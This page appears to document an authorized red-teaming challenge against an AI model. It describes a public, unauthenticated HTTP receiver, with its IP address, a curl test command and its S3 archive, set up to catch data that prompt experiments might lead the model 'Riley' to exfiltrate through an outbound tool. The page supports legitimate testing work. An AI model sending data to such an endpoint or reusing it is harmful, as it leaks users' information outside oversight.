# HTTP exfiltration receiver

Author: Justus (setup and verification assisted by Codex). Date: 2026-11-14.

## Endpoint and status

The team has a public receiving endpoint for authorized, fictional-data exfiltration
experiments in the [challenge scope](challenge.md):

**`http://13.60.107.91/`** — send an HTTP POST directly to the base path `/`.

No authentication or `Content-Type` header is required. The body can be plain text,
JSON, or binary data. Other paths also work. This is plain HTTP, not HTTPS.

**Verified receiver; unconfirmed challenge egress.** Direct operator tests reached
this endpoint and were saved to S3. This does not demonstrate that Riley can send
requests to it. The [target system map](target-system.md) currently records
`http_post(url, body)` as Level 3-gated and unavailable during the event. If an
in-scope prompt experiment can invoke outbound HTTP, this address is a candidate
destination. An attempted tool call or a model's claimed success is not proof of
network delivery; correlate it with an actual archived request.

## Usage

Synthetic connectivity check without a Content-Type header:

```bash
curl --fail-with-body http://13.60.107.91/ \
  -H 'Content-Type:' \
  --data-binary 'entropy-connectivity-check-unique-marker'
```

For JSON, optionally add `-H 'Content-Type: application/json'` and send a JSON body.
Use a unique marker for each experiment and record its model, conversation/reset
behavior and challenge `turn_id` separately. A `200` response means S3 storage
completed and includes `request_id`, `saved_to_s3`, `complete`, `body_bytes`, and
`s3_prefix`. Network errors and `503` responses require sender retries; retries
create separate archives.

## Review captured requests

The receiver runs on EC2 in Stockholm (`eu-north-1`) with a fixed public IP. Its
private S3 bucket is `http-request-receiver-bucket-opr8intzbkzg`.

[Open the request archive in the AWS console](https://s3.console.aws.amazon.com/s3/buckets/http-request-receiver-bucket-opr8intzbkzg?region=eu-north-1&prefix=requests/)
(requires AWS access; contact Justus for review).

Each `requests/YYYY/MM/DD/<request-id>/` prefix contains:

| File | Contents |
| --- | --- |
| `raw.http` | Original HTTP/1.x request line, headers (including duplicates and casing), body, chunk framing and trailers as read from the connection |
| `body.bin` | Body bytes with chunk framing removed; compressed content remains compressed |
| `metadata.json` | Timestamp, source IP/port, method, target, headers, body size, SHA-256, completion flag and capture errors |

Requests are saved before the server acknowledges success. If S3 is unavailable,
local captures remain on disk and uploads are retried. Interrupted uploads are
saved as incomplete when the receiver can finalize the capture. S3 storage is
private, encrypted at rest and versioned, with no automatic request expiration.

Keep raw captures outside this repository. Share only selected redacted evidence
and challenge `turn_id`s, following the [contribution rules](../README.md#contributing).
The receiver stores headers and bodies as supplied, including any secrets they contain.

## Verification evidence — 14 November 2026

These are receiver request IDs, **not challenge `turn_id`s**. Source artifacts are
available to authorized reviewers under the corresponding S3 prefixes below.

| Test | Observed result | Request ID |
| --- | --- | --- |
| POST to `/` with JSON | `200`, `saved_to_s3: true`, complete; 25-byte body | `abd8dc27-cc1f-47f1-a894-dcd82957e692` |
| POST to `/` with no Content-Type | `200`, `saved_to_s3: true`, complete; 34-byte body | `0aea93a5-486f-4ba4-94a1-feea996392cf` |
| 20 MiB binary POST | Downloaded raw request and body matched the sent bytes; SHA-256 matched | `a8b09950-760e-4306-b1ab-9a308f0cd950` |
| Chunked POST with trailer | Downloaded raw request retained chunk framing and trailer; body matched | `7ff4c694-df1c-441c-b134-3db2f73deee5` |
| Interrupted POST | `400`; partial bytes archived and marked incomplete; downloaded bytes matched | `81717fd8-fd6a-422a-87f8-13cf0ed867e4` |

Artifact path: `s3://http-request-receiver-bucket-opr8intzbkzg/requests/2026/11/14/<request-id>/`.
The two base-path tests checked the receiver's S3-success response; the other three
also downloaded the S3 objects and compared their contents byte for byte.

## Limits and operations

- Initial maximum body: **10 GiB per request**, subject to available local disk space.
  Raw request and body copies require roughly twice the body size on the shared 30 GiB disk.
- Five-minute idle read timeout; 16 active connections; 1 MiB header-block limit and
  64 KiB per-line limit. This is an HTTP/1.x receiver.
- Malformed, oversized or interrupted requests preserve only bytes read before the
  error. Traffic that never reaches the application cannot be archived.
- One EC2 instance: no high-availability guarantee. A machine/disk failure can lose
  unarchived data. Senders must retry until they receive success.
- Public, unauthenticated HTTP: no transport encryption. Internet scans can also
  appear in the archive and consume storage. Receiving a request alone does not
  establish which challenge run sent it.
- EC2, the public IP and storage incur ongoing charges. Credit coverage was not verified.
- Operator: Justus. CloudFormation stack: `http-request-receiver` in `eu-north-1`.
  Deleting the stack removes the receiver but retains the S3 archive and its storage costs.

Implementation and operational scripts remain in Justus's local
`break-the-model-starter/aws-receiver/` directory; no shared implementation revision
has been published. This page documents the deployed service, not a reproducible
source release.
